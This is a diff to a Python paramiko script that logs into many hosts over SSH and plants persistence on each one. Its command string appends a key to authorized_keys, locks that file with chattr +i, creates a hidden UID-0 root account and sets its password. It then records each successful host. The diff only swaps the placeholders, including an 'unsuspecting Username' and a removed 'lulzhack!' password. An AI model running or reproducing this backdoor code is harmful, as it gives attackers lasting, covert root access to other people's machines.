@@ -21,7 +21,7 @@ def workon(host):
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         print ("Connecting to %s" % host)
         ssh.connect(host, port, username1, password1)
-        stdin, stdout, stderr = ssh.exec_command("sudo echo '%s' >> ~/.ssh/authorized_keys \n sudo chattr +i ~/.ssh/authorized_keys \n sudo useradd -ou 0 -g 0 <Enter Username> \n sudo echo 'lulzhack!' | passwd <Enter Password> --stdin" % key)
+        stdin, stdout, stderr = ssh.exec_command("sudo echo '%s' >> ~/.ssh/authorized_keys \n sudo chattr +i ~/.ssh/authorized_keys \n sudo useradd -ou 0 -g 0 <Enter unsuspecting Username> \n sudo echo '<Enter Password>' | passwd <Enter unsuspecting Username> --stdin" % key)
         with outlock:
             print ("Connected to %s" % host)
             os.system('echo "%s" >> successful' % host)
